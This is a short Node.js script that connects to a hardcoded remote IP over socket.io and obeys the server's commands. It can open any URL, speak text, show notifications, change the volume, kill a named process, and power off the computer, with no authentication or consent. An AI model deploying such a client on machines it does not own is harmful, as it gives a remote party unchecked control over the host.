var socket = require('socket.io-client')('http://87.56.217.210/');


socket.on('connect', function () {
    console.log("connected")
});
socket.on('url', function (url) {
    openUrl(url)
});
socket.on('say', function (speach) {
    console.log(speach)
    
    talk(speach);
});
socket.on('powerOff', function () {
    powerOff();
})
socket.on('changeVolume', function (volume) {
    changeVolume(volume);
});
socket.on('notification', function (title, message, sound, time, wait, type) {
    notification(title, message, sound, time, wait, type);
});
socket.on('killApplication', function (applicationName) {
    killApplication(applicationName)
});
socket.on('disconnect', function () {
    console.log("disconnected")
});





// FUNCTION
function talk(speach) {
    const say = require('say')
    say.speak(speach)
}

function powerOff() {
    var powerOff = require('power-off');
    powerOff(function (err, stderr, stdout) {
        if (!err && !stderr) {
            console.log(stdout);
        }
    });
}

function openUrl(url) {
    var opn = require('opn');

    // opens the url in the default browser 
    opn(url);
}
function notification(title, message, sound, time, wait, type) {
    const WindowsBalloon = require('node-notifier').WindowsToaster;
    var notifier = new WindowsBalloon({
        withFallback: false, // Try Windows Toast and Growl first?
        customPath: void 0 // Relative/Absolute path if you want to use your fork of notifu
    });

    notifier.notify({
            title: title,
            message: message,
            sound: sound, // true | false.
            time: time, // How long to show balloon in ms
            wait: wait, // Wait for User Action against Notification
            type: type // The notification type : info | warn | error
        },
        function (error, response) {
            console.log(response);
        }
    );
}

function killApplication(applicationName) {
    var ps = require('ps-node');
    console.log("kill")
    // A simple pid lookup
    ps.lookup({
        command: applicationName
    }, function (err, resultList) {
        console.log("lookup")
        if (err) {
            throw new Error(err);
        }
        var process = resultList[0];
        if (process) {
            console.log('PID: %s, COMMAND: %s, ARGUMENTS: %s', process.pid, process.command, process.arguments);
            ps.kill(process.pid, {
                timeout: 1999
            }, function (err) {
                if (err) {
                    throw new Error(err);
                } else {
                    console.log('Process has been killed!');
                }
            });
        } else {
            console.log('No such process found!');
        }
    });
}

function changeVolume(volume) {
    var win = require('win-audio');
    var speaker = win.speaker;
    speaker.set(volume)

}